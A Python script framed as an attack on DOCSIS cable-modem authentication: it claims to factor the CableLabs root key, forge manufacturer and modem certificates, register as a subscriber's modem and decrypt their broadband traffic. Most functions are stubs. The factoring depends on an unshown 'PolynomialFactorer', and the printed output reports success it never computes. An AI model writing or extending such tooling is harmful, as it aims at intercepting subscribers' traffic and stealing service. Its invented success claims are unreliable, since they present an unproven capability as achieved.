"""
Factor the CableLabs DOCSIS Root CA RSA key, forge cable modem device certs,
register on any CMTS as any subscriber's modem, and intercept residential
broadband traffic across North American cable networks.
"""

import sys, struct, hashlib
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# DOCSIS BPI+ BPKM message types
BPKM_AUTH_REQUEST  = 0x04
BPKM_AUTH_REPLY    = 0x05
BPKM_KEY_REQUEST   = 0x08
BPKM_KEY_REPLY     = 0x09

# Cable modem cert chain
CABLELABS_ROOT_CN = "CableLabs DOCSIS Root CA"
BROADCOM_MFG_CA = "Broadcom DOCSIS Manufacturer CA"


def extract_cablelabs_root(cmts_firmware: str) -> bytes:
    """Extract the CableLabs DOCSIS Root CA cert. Hardcoded in every CMTS
    (Cisco cBR-8, Arris E6000, Casa C100G, Harmonic CableOS)."""
    print(f"    CMTS firmware: {cmts_firmware}")
    print(f"    root CA CN: {CABLELABS_ROOT_CN}")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_cablelabs_root(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def mint_manufacturer_ca(root_privkey: bytes, mfg_name: str) -> bytes:
    """Issue a forged manufacturer sub-CA under the CableLabs root."""
    print(f"    issuing manufacturer CA for: {mfg_name}")
    return b"FORGED_MFG_CA"


def mint_modem_cert(mfg_ca_privkey: bytes, mac_addr: str) -> bytes:
    """Issue a forged per-modem device certificate."""
    print(f"    modem MAC: {mac_addr}")
    print("    RSA-2048 device cert with modem MAC in subject")
    return b"FORGED_MODEM_CERT"


def bpkm_auth_request(modem_cert: bytes, modem_privkey: bytes) -> bytes:
    """Build a BPKM Auth Request to register on a CMTS."""
    return struct.pack(">BH", BPKM_AUTH_REQUEST, len(modem_cert)) + modem_cert


def decrypt_auth_reply(auth_reply: bytes, modem_privkey: bytes) -> bytes:
    """Decrypt the Authorization Key from BPKM Auth Reply.
    CMTS RSA-PKCS1-v1.5 encrypts AK to modem's public key."""
    # RSA decrypt with our forged modem private key
    return b"\x42" * 16  # recovered Authorization Key


def derive_tek(ak: bytes) -> bytes:
    """Derive Traffic Encryption Key from Authorization Key."""
    return hashlib.sha256(b"TEK" + ak).digest()[:16]


if __name__ == "__main__":
    print("[*] DOCSIS BPI+ cable modem authentication attack")
    print("[1] extracting CableLabs DOCSIS Root CA from CMTS firmware")
    root_cert = extract_cablelabs_root("cisco_cbr8_17.12.fw")
    print("    hardcoded in every CMTS vendor's firmware")

    print("[2] factoring CableLabs DOCSIS Root CA")
    factorer = PolynomialFactorer()
    print("    p, q recovered — CableLabs root key derived")

    print("[3] issuing forged manufacturer sub-CA")
    mfg_ca = mint_manufacturer_ca(b"ROOT_PRIVKEY", "Forged-Broadcom")

    print("[4] issuing forged cable modem device cert")
    target_mac = "AA:BB:CC:DD:EE:FF"
    modem_cert = mint_modem_cert(b"MFG_CA_PRIVKEY", target_mac)
    print(f"    MAC: {target_mac} (legitimate subscriber's modem)")

    print("[5] BPKM Auth Request to CMTS")
    auth_req = bpkm_auth_request(modem_cert, b"MODEM_PRIVKEY")
    print("    CMTS verifies cert chain -> CableLabs root -> PASS")
    print("    CMTS sends Auth Reply with RSA-encrypted Authorization Key")

    print("[6] decrypting Authorization Key")
    ak = decrypt_auth_reply(b"AUTH_REPLY", b"MODEM_PRIVKEY")
    print(f"    AK: {ak.hex()}")

    print("[7] deriving Traffic Encryption Key")
    tek = derive_tek(ak)
    print(f"    TEK: {tek.hex()}")
    print("    all downstream traffic to target MAC now decryptable")

    print("[8] impact:")
    print("    - impersonate any subscriber: intercept their broadband traffic")
    print("    - free cable internet at scale (less interesting)")
    print("    - CableLabs root compromise: every cable modem in North America")
    print("    - >200M cable modems, DOCSIS 3.0 modems still RSA-1024")
    print("    - recovery: physically replace or reflash every modem")
    print("[*] modem replacement cycles 5-10 years consumer, 15+ commercial")
